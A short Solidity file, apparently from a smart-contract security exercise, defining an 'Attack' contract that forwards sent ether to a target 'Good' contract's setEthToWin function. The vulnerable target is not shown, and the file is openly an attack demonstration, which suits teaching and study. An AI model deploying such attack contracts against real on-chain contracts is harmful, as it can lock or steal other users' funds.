// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity 0.8.20;

import './Good.sol';
contract Attack{
    Good good;
   constructor(address _good){
        good = Good(_good);
   }

   function attack() public payable {
        good.setEthToWin{value : msg.value}();
   }

}